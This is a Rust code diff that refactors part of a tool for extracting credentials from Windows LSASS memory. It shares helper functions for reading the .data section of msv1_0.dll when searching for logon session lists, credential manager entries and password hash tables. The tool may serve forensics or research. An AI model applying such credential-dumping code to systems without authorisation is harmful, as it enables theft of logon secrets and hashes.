@@ -1,6 +1,6 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
-use crate::lsass::types::{Arch, CredmanCredential, read_ptr, read_ustring, is_valid_user_ptr};
+use crate::lsass::types::{Arch, CredmanCredential, read_ptr, read_ustring, is_valid_user_ptr, read_data_section, read_ptr_from_buf};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
@@ -546,14 +546,6 @@ fn try_extract_credman_entry(
     })
 }
 
-/// Read a pointer from a raw byte slice based on architecture.
-fn read_ptr_from_buf(data: &[u8], off: usize, arch: Arch) -> u64 {
-    match arch {
-        Arch::X86 => super::types::read_u32_le(data, off).unwrap_or(0) as u64,
-        Arch::X64 => super::types::read_u64_le(data, off).unwrap_or(0),
-    }
-}
-
 /// Find MSV logon session list candidates in msv1_0.dll .data section.
 fn find_msv_list_candidates(
     vmem: &dyn VirtualMemory,
@@ -561,14 +553,11 @@ fn find_msv_list_candidates(
     msv_base: u64,
     arch: Arch,
 ) -> Result<Vec<u64>> {
-    let data_sec = match pe.find_section(".data") {
-        Some(s) => s,
-        None => return Ok(Vec::new()),
+    let (data_base, data) = match read_data_section(vmem, pe, msv_base, 0x10000, "msv1_0.dll") {
+        Ok(r) => r,
+        Err(_) => return Ok(Vec::new()),
     };
-
-    let data_base = msv_base + data_sec.virtual_address as u64;
-    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
-    let data = vmem.read_virt_bytes(data_base, data_size)?;
+    let data_size = data.len();
 
     let mut candidates = Vec::new();
     let step = arch.ptr_size() as usize;
@@ -617,14 +606,11 @@ fn find_inline_hash_table(
     arch: Arch,
 ) -> Result<Vec<(u64, usize)>> {
     let msv_end = msv_base + 0x100000;
-    let data_sec = match pe.find_section(".data") {
-        Some(s) => s,
-        None => return Ok(Vec::new()),
+    let (data_base, data) = match read_data_section(vmem, pe, msv_base, 0x10000, "msv1_0.dll") {
+        Ok(r) => r,
+        Err(_) => return Ok(Vec::new()),
     };
-
-    let data_base = msv_base + data_sec.virtual_address as u64;
-    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
-    let data = vmem.read_virt_bytes(data_base, data_size)?;
+    let data_size = data.len();
 
     let bucket_step = arch.list_entry_size() as usize;
 
